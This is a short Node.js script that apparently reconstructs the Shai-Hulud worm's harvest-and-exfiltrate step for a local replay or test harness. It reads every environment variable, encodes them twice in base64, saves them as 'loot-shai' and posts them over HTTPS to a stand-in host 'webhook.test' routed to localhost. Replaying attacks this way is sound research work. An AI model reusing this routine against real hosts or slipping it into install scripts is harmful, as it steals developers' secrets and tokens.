// Reconstruction of Shai-Hulud's harvest-and-exfiltrate step (September
// 2025), as an install script would run it: environment variables, encoded
// twice with base64, posted to a webhook over HTTPS. No self-propagation.
import { readFileSync, writeFileSync } from "node:fs";
import { request } from "node:https";
const cfg = JSON.parse(readFileSync("replay.json"));
const data = Buffer.from(Buffer.from(JSON.stringify({ environment: process.env })).toString("base64")).toString("base64");
writeFileSync("loot-shai", data);
const name = "webhook.test";
await new Promise((done) => {
  const req = request({ host: "127.0.0.1", port: cfg.ports[name], servername: name, method: "POST", path: "/hook", ca: readFileSync(cfg.ca), headers: { host: name } }, (res) => {
    res.resume();
    res.on("end", () => { console.log("exfil sent"); done(); });
  });
  req.on("error", (e) => { console.log("exfil refused", e.code); done(); });
  req.end(data);
});
